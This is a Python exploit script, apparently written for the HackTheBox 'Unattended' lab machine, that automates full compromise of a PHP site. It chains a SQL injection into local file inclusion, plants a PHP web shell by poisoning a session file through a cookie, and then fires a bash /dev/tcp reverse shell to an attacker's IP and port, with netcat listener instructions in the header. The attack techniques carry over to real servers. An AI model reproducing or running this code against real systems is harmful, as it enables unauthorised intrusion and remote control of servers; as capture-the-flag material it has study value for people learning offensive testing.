#!/usr/bin/python3
# This script was created to automate getting a reverse shell in unattended.htb machine via:
# + Through a SQL Injection, perform a LFI to read arbitrary files.
# + Hijack a php session file to inject arbitrary commands.
# + Once php cmd file has been injected, pass a reverse shell command and execute it.
#
# Note: It is recommended to use port 80, 443 when running the reverse shell, other ports might not work. 
#
# Author: @nightwolfx2
# 
# Exploit Usage:
# On a separated terminal, start a netcat listener, example:
# $nc -l -p 443 -v
#
# Run the exploit as follows:
# └─$ python3 unattended.py -t 10.10.10.126 -p 443 -a xx.xx.xx.xx -l yyy
# [+] Attempting to obtain the cookie value
# [+] Attempting to read session file and poison it
# [+] Attempting to perform RCE once the session cookie file has been injected with php code...
# [+] Reverse shell on its way!...

import argparse
import requests
import urllib3
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # Ignore SSL Cert warning

PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def get_cookie(full_target):
	url = "https://%s/index.php?id=test" % full_target
	headers = {"Host": "www.nestedflanders.htb",
		"Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	res = requests.get(url, headers=headers, verify=False)
	res.close()
	php_ses = res.headers['Set-Cookie']
	suf_php_ses = php_ses.split("PHPSESSID=",1)[1]
	fin_php_ses = suf_php_ses.split(";",1)[0]
	return fin_php_ses

def get_rev_shell(full_target,session, attacker_ip, attacker_port):
	# Inject php code into a php session file.
	url = "https://%s/index.php?id=" % (full_target)
	headers = {"Host": "www.nestedflanders.htb", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Language": "en-US,en;q=0.9"}
	cookies = { "PHPSESSID": session }
	res = requests.get(url, headers=headers, cookies=cookies, verify=False)
	# Call once the injected session file
	url = "https://%s/index.php?id=465%%27+and+1=2+UNION+SELECT+%%27about%%5C%%27+UNION+SELECT+%%5C%%27/var/lib/php/sessions/sess_%s%%27--+-" % (full_target, session)
	headers = {"Host": "www.nestedflanders.htb", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Language": "en-US,en;q=0.9"}
	php_rce = "<%3fphp+system($_REQUEST['cmd'])%3b+%3f>"
	cookies = {"PHPSESSID": session, "RCE": php_rce}
	print("[+] Attempting to read session file and poison it")
	res = requests.get(url, headers=headers, cookies=cookies, verify=False)
	# Build reverse shell command to be executed an call it.
	payload = "bash+-c+'bash+-i+>%%26+/dev/tcp/%s/%s+0>%%261'" % (attacker_ip, attacker_port)
	url = "https://%s/index.php?cmd=%s&id=465%%27+and+1=2+UNION+SELECT+%%27about\\%%27+UNION+SELECT+\\%%27/var/lib/php/sessions/sess_%s%%27--+-" % (full_target, payload, session)
	cookies = {"PHPSESSID": session, "rce": "<%3fphp+system($_REQUEST['cmd'])%3b+%3f>"}
	headers = {"Host": "www.nestedflanders.htb", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	print("[+] Attempting to perform RCE once the session cookie file has been injected with php code...")
	try: 
		res = requests.get(url, headers=headers, cookies=cookies, verify=False, timeout=5)
	except: 
		print("[+] Reverse shell on its way!...")
		exit(0)

def main():
	print("Skeleton")

if __name__ == '__main__':
	username=""
	parser = argparse.ArgumentParser()
	parser.add_argument('-t','--target', help='host/ip to target, required=True')
	parser.add_argument('-p','--port', help='target port, required=True')
	parser.add_argument('-a','--attacker', help='attacker_ip, required=True')
	parser.add_argument('-l','--listener', help='attacker port listening, required=True')
	args = parser.parse_args()
	full_target = args.target + ":" + args.port
	attacker_ip = args.attacker
	attacker_port = args.listener
	args = parser.parse_args()
	full_target = args.target + ":" + args.port
	print("[+] Attempting to obtain the cookie value")
	session=get_cookie(full_target)
	if len(session) == 0:
		print("[-] Error, couldn't obtain a cookie value. Exploit failed...")
	else:
		get_rev_shell(full_target,session, attacker_ip, attacker_port)
